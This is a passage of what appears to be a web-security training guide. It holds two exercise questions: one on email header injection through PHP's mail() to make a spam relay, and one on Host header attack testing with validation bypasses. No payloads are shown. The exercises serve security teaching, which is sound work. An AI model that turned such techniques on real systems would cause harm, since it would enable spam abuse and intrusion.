5. **A contact form on a PHP application uses the `mail()` function with the user's email address in the `From:` header. Demonstrate an email header injection attack that turns the application into a spam relay, and recommend secure coding practices that would prevent this vulnerability.**

6. **You are conducting a penetration test and suspect a web application is vulnerable to Host header attacks. Describe your systematic testing methodology, including at least five different techniques for manipulating the Host header (including bypasses for basic validation), and the tools you would use.**

---

*Previous: [05-template-injection-ssti.md](05-template-injection-ssti.md)*

---

*[Back to README](../README.md)*
